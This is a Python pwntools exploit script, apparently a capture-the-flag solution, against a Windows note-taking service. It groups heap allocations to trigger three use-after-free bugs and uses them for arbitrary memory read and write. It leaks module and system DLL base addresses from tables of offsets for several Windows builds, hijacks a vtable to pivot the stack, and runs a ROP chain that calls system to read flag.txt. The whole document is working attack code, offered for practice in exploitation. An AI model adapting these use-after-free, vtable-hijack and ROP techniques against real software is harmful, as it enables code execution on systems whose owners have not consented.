from pwn import *
import struct

def choice_prompt():
    p.recvuntil('choice> ')
    
def new_note(reference_number, epoch, contents, count=0):
    if count:
        return new_note.count
    if type(contents) == str:
        contents = contents.encode("utf-8")
    if b'\n' in contents:
        raise Exception(f"new note#{reference_number} epoch={epoch}: new line found in the input")    	
    data = ""
    choice_prompt()
    p.sendline("1")
    p.recvuntil("Note reference number: ")
    p.sendline(str(reference_number))
    p.recvuntil("Epoch time: ")
    p.sendline(str(epoch))
    p.recvuntil("Note contents: ")
    p.sendline(contents)
    new_note.count = new_note.count + 1 if 'count' in new_note.__dict__ else 1
    
def edit_note(reference_number, new_content, new_reference_number=-1, new_epoch=0, mode=1):
    if type(new_content) == str:
        new_content = new_content.encode("utf-8")
    if b'\n' in new_content:
        raise Exception(f"edit note#{reference_number}: new line found in the input")   
    if new_reference_number == -1:
        new_reference_number = reference_number

    choice_prompt()
    p.sendline("2")
    p.recvuntil("Note reference number to edit: ")
    p.sendline(str(reference_number))
    found = p.recvuntil("New reference number: ")
    if not found:
        raise Exception(f"edit note#{reference_number}: couldn't find the specific note")
    p.sendline(str(new_reference_number))
    p.recvuntil("New epoch time: ")
    p.sendline(str(new_epoch))
    p.recvuntil("New content to add: ")
    p.sendline(new_content)
    p.recvuntil("Content replacement mode: ")
    p.sendline(str(mode))
        
def print_note(reference_number):
    choice_prompt()
    p.sendline("3")
    p.recvuntil("Note reference number: ")
    p.sendline(str(reference_number))
    found = p.recvuntil(f"Note {reference_number}")
    if not found:
        raise Exception(f"print note#{reference_number}: couldn't find the specific note")
    p.recvuntil("(")
    epoch = p.recvuntil(")", drop=True)
    p.recvuntil("Contents: ")
    contents = p.recvuntil("\r\n", drop=True)
    return (contents, epoch)

def print_note_debug(reference_number):
    choice_prompt()
    p.sendline("3")
    p.recvuntil("Note reference number: ")
    p.sendline(str(reference_number))
    heap = p.recvuntil(f"DEBUG MODE", drop=True)
    return heap
    
def filter_note(reference_number):
    choice_prompt()
    p.sendline("4")
    p.recvuntil("Note reference number: ")
    p.sendline(str(reference_number))
    found = p.recvuntil(f"Filtered [#{reference_number}]")
    if not found:
        raise Exception(f"filter note#{reference_number}: couldn't find the specific note")

def read_mem(addr):
    edit_note(uaf2_new_ref, p64(addr) + p64(0) + p64(0) + p64(0x11223344)[:7], mode=0)
    content, _ = print_note(uaf2_old_ref)
    return content
        
    
def read_n(addr, n):
    data = b""
    current_addr = addr
    
    while len(data) < n:
        current_data = read_mem(current_addr) + b"\x00"
        data += current_data
        current_addr += len(current_data)
    return data[:n]

def read_addr(addr):
    def sign_extend(n):
        return n | ((~((1<<48)-1)) * (n >> 47))
    
    return sign_extend(u64(read_n(addr, 6).ljust(8, b'\x00')))
    
def write_mem(addr, data):
    assert(type(data) == bytes)
    
    edit_note(-1, "_", "-1", addr - notes_vtable)
    edit_note(uaf1_old_ref, data)
    
def leak_address():  
    def strip_junk(data, addr):
        junk_data = struct.pack("Q", addr)[2:]
        assert(b'%' not in junk_data) #needs refinement in this case
        assert(junk_data.find(b"\x00") != -1) #unlikely, we can remove the assertion probably won cause an issue
        junk_data = junk_data[:junk_data.find(b"\x00")]
        i = data.find(junk_data)
        if i == -1 or junk_data == "":
            return data
        return data[:i]
    
    edit_note(uaf3_old_ref, p64(vtable_addr_percent_g), mode=0)
    data = print_note_debug(uaf3_new_ref)
    data = data.split(b"\r\n")[-1]
    perc_g_data = strip_junk(data, vtable_addr_percent_g)
    perc_g_n = struct.unpack("Q", struct.pack("d", float(perc_g_data)))[0]
    
    edit_note(uaf3_old_ref, p64(vtable_addr_percent_i), mode=0)
    data = print_note_debug(uaf3_new_ref)
    data = data.split(b"\r\n")[-1]
    perc_i_data = strip_junk(data, vtable_addr_percent_i)
    perc_i_n = struct.unpack("I", struct.pack("i", int(perc_i_data)))[0]

    return (perc_g_n & ~0xffffffff) + perc_i_n
    
def debug_note(note_addr):
    print("Note: " + hex(note_addr))
    vptr = u64(read_n(note_addr, 8))
    print("vptr: " + hex(vptr))
    content = u64(read_n(note_addr + 8, 8))
    print("content: " + hex(content))
    epoch = u64(read_n(note_addr + 16, 6))
    print("epoch: " + hex(epoch))
    ref = u64(read_n(note_addr + 24, 6))
    print("ref: " + hex(ref))
    
    #vfptr1 = u64(read_n(vptr, 8))
    #print("vfptr1: " + hex(vfptr1))
    #vfptr2 = u64(read_n(vptr, 8))
    #print("vfptr2: " + hex(vfptr2))

def read_all(timeout=4):
    data = b""
    while p.can_recv(timeout=timeout):
        data += p.recv()
    return data

class AddressBook:
    _release_ids = None
    _release_iter = None
    _current_release = None
    _elements = {}

    def __init__(self, release = None, release_ids = None):
        self._current_release = release or self.next_release()
        self._release_ids = set(release_ids or {})

    def __getattr__(self, name):
        if name[0] == '_':
            return super(AddressBook, self).__getattribute__(name)

        if type(self._elements[name]) == dict:
            return self._elements[name][self._current_release]
        else: 
            return self._elements[name]
        

    def __setattr__(self, name, value):
        if name[0] != '_':
            if name[-3:] == "_v_":
                name_parts = name.split("_v_")
                assert(len(name_parts) == 3)
                name = name_parts[0]
                winver = name_parts[1]
                self._release_ids.add(winver)
                if name in self._elements:
                    assert(type(self._elements[name]) == dict)
                    self._elements[name][winver] = value
                else:
                    self._elements[name] = {winver: value}
            else:
                self._elements[name] = value
        else:
            super(AddressBook, self).__setattr__(name, value)

    def next_release(self):
        if not self._release_iter:
            self._release_iter = iter(self._release_ids)
        try:
            self._current_release = next(self._release_iter)
            return True
        except StopIteration:
            return False


if args['HOST'] and args['PORT']:
    p = remote(args['HOST'], int(args['PORT']))
else:
    p = remote("127.0.0.1", 4444)

context.arch = 'amd64'
p.settimeout(10)

system_rva = 0x4190
note_vtable_rva = 0x47e8
g_debug_rva = 0x6750
printf_rva = 0x1060
old_main_rva = 0x1eb3 #call GetOption<-main

#the proper version will be identified during runtime, this will be the first
#version checked for efficiency
winver = args['WIN'] or "2004_19041"

address_book = AddressBook(winver)

address_book.ntdll_RtlEnterCriticalSection_iat_rva = 0x4000
address_book.kernel32_GetCurrentProcess_iat_rva = 0x40c0

#the following rvas were generated with Scouter
address_book.kernelbase_Beep_iat_rva_v_1607_v_ = 0x750e0
address_book.ntdll_RtlEnterCriticalSection_base_rva_v_1607_v_ = 0x24B50
address_book.kernel32_GetCurrentProcess_base_rva_v_1607_v_ = 0x16A00
address_book.kernelbase_Beep_base_rva_v_1607_v_ = 0xC61A0
address_book.gadget1_rva_kernelbase_v_1607_v_ = 0x007E18D
address_book.gadget2_rva_ntdll_v_1607_v_ = 0x988cd

address_book.kernelbase_Beep_iat_rva_v_1903_v_ = 0x78da0
address_book.ntdll_RtlEnterCriticalSection_base_rva_v_1903_v_ = 0x1B380
address_book.kernel32_GetCurrentProcess_base_rva_v_1903_v_ = 0x21DB0
address_book.kernelbase_Beep_base_rva_v_1903_v_ = 0xF6DB0
address_book.gadget1_rva_kernelbase_v_1903_v_ = 0x008F959
address_book.gadget2_rva_ntdll_v_1903_v_ = 0x8ea7b

address_book.kernelbase_Beep_iat_rva_v_1909_18363_v_ = 0x78da0
address_book.ntdll_RtlEnterCriticalSection_base_rva_v_1909_18363_v_ = 0x1B380
address_book.kernel32_GetCurrentProcess_base_rva_v_1909_18363_v_ = 0x21DB0
address_book.kernelbase_Beep_base_rva_v_1909_18363_v_ = 0xF6DB0
address_book.gadget1_rva_kernelbase_v_1909_18363_v_ = 0x008F959
address_book.gadget2_rva_ntdll_v_1909_18363_v_ = 0x8ea7b

address_book.kernelbase_Beep_iat_rva_v_2004_v_ = 0x82410
address_book.ntdll_RtlEnterCriticalSection_base_rva_v_2004_v_ = 0x213A0
address_book.kernel32_GetCurrentProcess_base_rva_v_2004_v_ = 0x24820
address_book.kernelbase_Beep_base_rva_v_2004_v_ = 0x102420
address_book.gadget1_rva_kernelbase_v_2004_v_ = 0x00904F9
address_book.gadget2_rva_ntdll_v_2004_v_ = 0x8daaf

address_book.kernelbase_Beep_iat_rva_v_2004_19041_v_ = 0x82418
address_book.ntdll_RtlEnterCriticalSection_base_rva_v_2004_19041_v_ = 0x213A0
address_book.kernel32_GetCurrentProcess_base_rva_v_2004_19041_v_ = 0x24880
address_book.kernelbase_Beep_base_rva_v_2004_19041_v_ = 0x102700
address_book.gadget1_rva_kernelbase_v_2004_19041_v_ = 0x00906D9
address_book.gadget2_rva_ntdll_v_2004_19041_v_ = 0x8dd1f

UAF_1_BASE_REF = 10000
UAF_2_BASE_REF = 20000
UAF_3_BASE_REF = 30000
ROPCHAIN_BASE_REF = 40000
STACK_BASE_REF = 50000

print("Starting...")
stack_ref = STACK_BASE_REF + 0
new_note(stack_ref, 1000, "A" * 1000) #max allocation size 1024, use append mode to build 10000 stack needed by
                                      #system
new_note(1, 1000, "A" * 31)
new_note(1, 1000, "A" * 31)
new_note(1, 1000, "A" * 31)
new_note(1, 1000, "A" * 31)
new_note(1, 1000, "A" * 31)
new_note(1, 1000, "A" * 31)
new_note(1, 1000, "A" * 31)
new_note(1, 1000, "A" * 31)
new_note(1, 1000, "A" * 31)


print("Triggering UAF on String<-Note...")
#allocate note in string (leak vptr)
def uaf1(n, tries=30):
    base_ref = UAF_1_BASE_REF + n * tries
    uaf1_old_ref = base_ref
    new_note(uaf1_old_ref, 1000, "xxx")
    filter_note(uaf1_old_ref)

    for uaf1_new_ref in range(base_ref + 1, base_ref + tries):
        new_note(uaf1_new_ref, 1, "")
        content, _ = print_note(uaf1_old_ref)
        if 5 <= len(content) <= 8:
            return uaf1_new_ref, content
            
    return -1

tries = 30
for i in range(10):
    uaf1_new_ref, leaked_content = uaf1(i, tries)
    if uaf1_new_ref != -1:
        break
        
if uaf1_new_ref == -1:
   raise Exception(f"Couldn't allocate note on the string class")

uaf1_old_ref = UAF_1_BASE_REF + i * tries

print(f"Successfully allocated note #{uaf1_new_ref} in string class #{uaf1_old_ref} in {i} iterations")
print_data = leaked_content
print_addr = u64(leaked_content.ljust(8, b'\x00'))
module_base = print_addr & ~0xffff

print("Module base: " + hex(module_base))


print("Triggering UAF on String<-Note's chr*...")
#no address leakage but we can have arbitrary absolute address read/write
def uaf2(n, tries=30):
    read_base = UAF_2_BASE_REF + n * tries
    uaf2_old_ref = read_base
    n_victims = 4
    
    for i in range(n_victims):
        new_note(uaf2_old_ref + i, 1000, "xxx")
    
    for i in range(n_victims):
        filter_note(uaf2_old_ref + i)
    
    signature = b"MZ\x90"
    for uaf2_new_ref in range(read_base + n_victims, read_base + tries):
        new_note(uaf2_new_ref, 1, p64(module_base) + p64(1555) + p64(44) + p64(444)[:7])
        for i in range(n_victims):
            content, _ = print_note(uaf2_old_ref + i)
            if content == signature:
                return uaf2_new_ref, uaf2_old_ref + i
    return -1, -1

tries = 30
for i in range(20):
    uaf2_new_ref, uaf2_old_ref = uaf2(i, tries)
    if uaf2_new_ref != -1:
        break
                
if uaf2_new_ref == -1:
   raise Exception(f"Couldn't allocate char* on the freed string class")

    
print(f"Successfully allocated Note's chr* #{uaf2_new_ref} in string class #{uaf2_old_ref} in {i} iterations")

system = read_addr(module_base + system_rva)
print("system " + hex(system))

#better to add all the calculations within the loop to avoid collisions
#continue+next_build when misalignment and break the loop in the last address
#calc if it's properly aligned
while True:
    ntdll_RtlEnterCriticalSection = read_addr(module_base + address_book.ntdll_RtlEnterCriticalSection_iat_rva)
    ntdll_base = ntdll_RtlEnterCriticalSection - address_book.ntdll_RtlEnterCriticalSection_base_rva
    if (ntdll_base & (2**16-1))==0 or not address_book.next_release():
        break
print(f"ntdll_base is {ntdll_base:#x}", address_book._current_release)
assert((ntdll_base & (2**16-1))==0)

kernel32_GetCurrentProcess = read_addr(module_base + address_book.kernel32_GetCurrentProcess_iat_rva)
kernel32_base = kernel32_GetCurrentProcess - address_book.kernel32_GetCurrentProcess_base_rva
print(f"kernel32_base is {kernel32_base:#x}")
assert((kernel32_base & (2**16-1))==0)

kernelbase_Beep = read_addr(kernel32_base + address_book.kernelbase_Beep_iat_rva)
kernelbase_base = kernelbase_Beep - address_book.kernelbase_Beep_base_rva
print(f"kernelbase_base is {kernelbase_base:#x}")
assert((kernelbase_base & (2**16-1))==0)

#mov rsp, qword ptr [r8+98h];ret
gadget1 = kernelbase_base + address_book.gadget1_rva_kernelbase
#pop rcx; ret
gadget2 = ntdll_base + address_book.gadget2_rva_ntdll
print(f"gadget1 is {gadget1:#x}")
print(f"gadget2 is {gadget2:#x}")

notes_vtable = module_base + note_vtable_rva
edit_note(uaf1_new_ref, "asd", "-1", 0) #setting refnumber=-1
g_debug = module_base + g_debug_rva 
print("Modifying g_debug at " + hex(g_debug))
write_mem(g_debug, b"1")


print("-Allocating chr* to note-")
print("Setting up the %g vfptr")
vtable_addr_percent_g = module_base + 0x6525
printf = module_base + printf_rva
write_mem(vtable_addr_percent_g, p64(printf))

print("Setting up the %i vfptr")
vtable_addr_percent_i = module_base + 0x6925
write_mem(vtable_addr_percent_i, p64(printf))

print("Triggering UAF on Note<-Note's chr*...")

def uaf3(n, tries=30):
    base_ref = UAF_3_BASE_REF + n * tries
    new_note(base_ref, 1000, "xxx")
    filter_note(base_ref)
    
    for uaf3_new_ref in range(2, 16):
        new_note(uaf3_new_ref, 15, "")

    content, _ = print_note(base_ref)
    if content[:2] != p16(note_vtable_rva):
        for i in range(2, 16):
            edit_note(i, "", 16, 1, 0)
        return -1

    edit_note(base_ref, p64(vtable_addr_percent_i), mode=0)
    for uaf3_new_ref in range(2,16): 
        data = print_note_debug(uaf3_new_ref)
        if data and data[:4]!=b"Note":
            return uaf3_new_ref
    return -1
    
tries = 30
for i in range(20):
    uaf3_new_ref = uaf3(i, tries)
    if uaf3_new_ref != -1:
        break
        
assert(uaf3_new_ref != -1)
uaf3_old_ref = UAF_3_BASE_REF + i * tries #we can determine the exact old_ref but not necessary
print(f"Successfully allocated note's #{uaf3_new_ref} chr* to note #{uaf3_old_ref} {i} iterations")

print("Now let's take the flag...")
#start the final exploitation phase

#new stack allocation
rop_chain = flat([
    1,#gadget2,
    2, #stage2_stack+56,
    1337,#system,
    4,
])

#too much trouble for putting the command in the stack
command = b"type flag.txt"
stack_land_offset = 112
rpi_padding = 32 - (len(rop_chain)-rop_chain.index(p64(1337))-2*8)
if rpi_padding <= 0: rpi_padding = 0
command_offset = len(rop_chain) + rpi_padding
#windows x64 abi requires 16 byte alignment for stack, system uses movaps on x86
assert((stack_land_offset+rop_chain.index(p64(1337))) % 16 == 0)

print("Expanding the first note to be used as the fake stack")
edit_note(stack_ref, "A" * 1000, mode=1)
edit_note(stack_ref, "A" * 1000, mode=1)
edit_note(stack_ref, "A" * 1000, mode=1)
edit_note(stack_ref, "A" * 1000, mode=1)
edit_note(stack_ref, "A" * 1000, mode=1)
edit_note(stack_ref, "A" * 1000, mode=1)
edit_note(stack_ref, "A" * 1000, mode=1)
edit_note(stack_ref, "A" * 1000, mode=1)
edit_note(stack_ref, b"A" * (1000 - stack_land_offset) + rop_chain + b"1"*rpi_padding + command, mode=1)
print("Stack allocation complete")

print("Leaking the fake stack address... ")
vector_begin = leak_address()
vector_end = vector_begin + new_note(1,1,1,1)*8
print(f"vectorBegin is {vector_begin:#x}")
print(f"vectorEnd is {vector_end:#x}")
note1 = read_addr(vector_begin)
print(f"First note's address is {note1:#x}")
note1_string = read_addr(note1 + 8)
note1_buf = read_addr(note1_string)
print(f"First note's chr* and stack limit is {note1_buf:#x}")

stage2_stack = note1_buf + 10000 - stack_land_offset
#vptr
print("Setting up the fake vtable with the stack pivot gadget")
fake_vptr = vtable_addr_percent_i #reuse since we don't need any more reads
fake_vtable = [gadget1]
write_mem(fake_vptr, flat(fake_vtable))
write_mem(note1, p64(fake_vptr))

print("Setting up the address of the fake stack...")
write_mem(vector_end+0x98, p64(stage2_stack))

print("Writing the final rop chain...")
old_main = module_base + old_main_rva
rop_chain = flat([
    gadget2,
    stage2_stack+command_offset,
    system,
    old_main,
])
write_mem(stage2_stack, rop_chain)

print(b"Triggering system to execute: " + command)
p.sendline("3")
p.sendline(str(stack_ref))
print(read_all().split(b"Note reference number: ")[-1].split(b"\r\n===")[0])
